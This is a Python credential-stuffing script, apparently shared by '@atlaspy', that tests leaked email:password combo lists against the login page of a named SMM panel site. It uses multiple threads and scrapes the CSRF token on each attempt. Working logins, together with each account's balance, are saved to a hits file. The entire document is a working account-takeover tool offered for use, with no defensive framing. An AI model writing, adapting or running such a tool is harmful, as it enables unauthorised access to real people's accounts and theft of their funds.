# @atlaspy & @atlaspython
import requests
import re
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import os
import signal
import sys
from colorama import Fore, Style, init
import random
import string
import json
import hashlib
import uuid
from cfonts import render

init(autoreset=True)

R = '\033[1;31m'
G = '\033[1;32m'
Y = '\033[1;33m'
B = '\033[1;34m'
W = '\033[1;37m'
C = '\033[0;36m'

AtlasPy = render('CheapSMM', colors=['blue', 'white'], align='center')
print("—" * 67)
print(AtlasPy)
print("—" * 67)

class CheapSMMChecker:
    def __init__(self):
        self.hit = 0
        self.bad = 0
        self.checked = 0
        self.total = 0
        self.lock = threading.Lock()
        self.stop = False
        self.base_url = "https://cheapsmmpanel.com"

    def signal_handler(self, sig, frame):
        self.stop = True

    def save(self, email, password, balance):
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open('CheapSMM_Hits.txt', 'a', encoding='utf-8') as f:
            f.write(f"[{ts}] {email}:{password} | Bakiye: ${balance}\n")

    def check(self, combo):
        if self.stop:
            return
        
        try:
            email, password = combo.strip().split(':', 1)
            
            session = requests.Session()
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'text/html,application/xhtml+xml',
                'Referer': f'{self.base_url}/login'
            }
            
           
            login_page = session.get(f"{self.base_url}/login", headers=headers, timeout=10)
            
           
            csrf_token = None
            csrf_match = re.search(r'name="_token"\s+value="([^"]+)"', login_page.text)
            if csrf_match:
                csrf_token = csrf_match.group(1)
            else:
                
                token_match = re.search(r'<input[^>]*name="_token"[^>]*value="([^"]+)"', login_page.text)
                if token_match:
                    csrf_token = token_match.group(1)
            
            if not csrf_token:
                with self.lock:
                    self.bad += 1
                    self.checked += 1
                return
            
            
            login_data = {
                '_token': csrf_token,
                'email': email,
                'password': password
            }
            
            login_headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                'Origin': self.base_url,
                'Referer': f'{self.base_url}/login',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            
            login_response = session.post(f"{self.base_url}/login", data=login_data, headers=login_headers, timeout=10, allow_redirects=True)
            
           
            if "dashboard" in login_response.url.lower() or "login" not in login_response.url.lower():
               
                dashboard = session.get(self.base_url, headers=headers, timeout=10)
                
                
                balance_match = re.search(r"userFunds\s*=\s*'([^']+)'", dashboard.text)
                if not balance_match:
                    balance_match = re.search(r'\$\s*([0-9,]+\.?[0-9]*)', dashboard.text)
                if not balance_match:
                    balance_match = re.search(r'data-balance="([^"]+)"', dashboard.text)
                
                balance = balance_match.group(1) if balance_match else "0.00"
                
               
                username_match = re.search(r'<span[^>]*class="[^"]*user[^"]*"[^>]*>([^<]+)</span>', dashboard.text)
                if not username_match:
                    username_match = re.search(r'Welcome,\s*([^<]+)', dashboard.text)
                
                username = username_match.group(1).strip() if username_match else email.split('@')[0]
                
                with self.lock:
                    self.hit += 1
                    self.checked += 1
                    self.save(email, password, balance)
                
                print(f"{G}[HIT] {email}:{password} | {username} | ${balance}{W}")
            else:
                with self.lock:
                    self.bad += 1
                    self.checked += 1
                print(f"{R}[BAD] {email}:{password}{W}")
                
        except Exception as e:
            with self.lock:
                self.bad += 1
                self.checked += 1
            print(f"{R}[ERR] {combo.strip()} - {str(e)[:50]}{W}")

    def run(self):
        signal.signal(signal.SIGINT, self.signal_handler)
        
        filepath = input(f"{Y}[•] Combo dosyası: {W}").strip()
        
        if not os.path.exists(filepath):
            print(f"{R}Dosya bulunamadı{W}")
            return
        
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            combos = [x.strip() for x in f.readlines() if x.strip() and ':' in x]
        
        self.total = len(combos)
        print(f"{G}✓ {self.total} combo yüklendi{W}")
        
        try:
            threads = int(input(f"{Y}[•] Thread sayısı (1-20): {W}").strip() or 5)
            threads = max(1, min(20, threads))
        except:
            threads = 5
        
        
        start = time.time()
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(self.check, combo) for combo in combos]
            for future in as_completed(futures):
                if self.stop:
                    executor.shutdown(wait=False)
                    break
        
        elapsed = time.time() - start
        
        
        print(f"{G}✓ HIT: {self.hit}{W} | {R}✗ BAD: {self.bad}{W}")
        
if __name__ == "__main__":
    checker = CheapSMMChecker()
    checker.run()